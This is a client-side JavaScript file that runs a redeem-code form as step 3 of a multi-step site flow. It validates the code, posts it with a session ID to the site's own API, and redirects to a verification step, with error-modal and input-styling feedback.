document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('redeemCodeForm');
    const redeemCodeInput = document.getElementById('redeemCode');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const errorModal = document.getElementById('errorModal');
    const errorMessage = document.getElementById('errorMessage');

    // Get session ID from URL or storage
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('sessionId') || localStorage.getItem('sessionId');

    if (!sessionId) {
        alert('Session expired. Please start over.');
        window.location.href = '/';
        return;
    }

    // Auto-format redeem code input (uppercase, remove spaces)
    redeemCodeInput.addEventListener('input', function() {
        this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
    });

    // Handle form submission
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const redeemCode = redeemCodeInput.value.trim();
        
        if (!redeemCode) {
            showError('Please enter a redeem code.');
            return;
        }

        // Show loading
        loadingOverlay.style.display = 'flex';
        
        try {
            const response = await fetch('/api/step3', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    redeemCode: redeemCode,
                    sessionId: sessionId
                })
            });
            
            const data = await response.json();
            
            if (data.success) {
                // Store session ID for next step
                localStorage.setItem('sessionId', sessionId);
                
                // Redirect to step 4 (verification)
                window.location.href = `/step4?sessionId=${sessionId}`;
            } else {
                showError(data.message || 'Invalid redeem code. Please try again.');
            }
        } catch (error) {
            console.error('Error:', error);
            showError('Network error. Please check your connection and try again.');
        } finally {
            loadingOverlay.style.display = 'none';
        }
    });

    function showError(message) {
        errorMessage.textContent = message;
        errorModal.style.display = 'flex';
        
        // Add shake animation to the form
        form.classList.add('shake');
        setTimeout(() => {
            form.classList.remove('shake');
        }, 600);
    }

    // Close error modal function (global)
    window.closeErrorModal = function() {
        errorModal.style.display = 'none';
        redeemCodeInput.focus();
    };

    // Auto-focus on redeem code input
    redeemCodeInput.focus();

    // Add shake animation class to CSS if not exists
    if (!document.querySelector('style[data-shake]')) {
        const style = document.createElement('style');
        style.setAttribute('data-shake', 'true');
        style.textContent = `
            @keyframes shake {
                0%, 20%, 40%, 60%, 80% { transform: translateX(0); }
                10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
            }
            .shake {
                animation: shake 0.6s ease-in-out;
            }
        `;
        document.head.appendChild(style);
    }

    // Add visual feedback for input validation
    redeemCodeInput.addEventListener('blur', function() {
        const value = this.value.trim();
        if (value && value.length < 10) {
            this.style.borderColor = '#ff4444';
            this.style.boxShadow = '0 0 10px rgba(255, 68, 68, 0.3)';
        } else if (value) {
            this.style.borderColor = '#00ff88';
            this.style.boxShadow = '0 0 10px rgba(0, 255, 136, 0.3)';
        } else {
            this.style.borderColor = '';
            this.style.boxShadow = '';
        }
    });

    // Reset validation styling on focus
    redeemCodeInput.addEventListener('focus', function() {
        this.style.borderColor = '';
        this.style.boxShadow = '';
    });
});